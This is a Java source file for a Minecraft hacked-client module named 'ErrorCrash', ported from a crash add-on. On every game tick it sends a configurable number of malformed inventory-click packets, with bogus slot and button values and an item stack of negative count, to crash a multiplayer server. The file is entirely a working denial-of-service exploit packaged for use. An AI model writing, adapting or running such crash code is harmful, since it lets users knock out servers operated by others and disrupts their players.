// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

public class ErrorCrash extends Module {
    private final Setting<Integer> amount = new Setting<>("Amount", 15, 1, 100);

    public ErrorCrash() {
        super("ErrorCrash", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null) return;
        Int2ObjectMap<ItemStack> map = new Int2ObjectArrayMap<>();
        map.put(0, new ItemStack(Items.RED_DYE, 1));
        for (int i = 0; i < amount.getValue(); i++) {
            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, 123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), map));
        }
    }
}
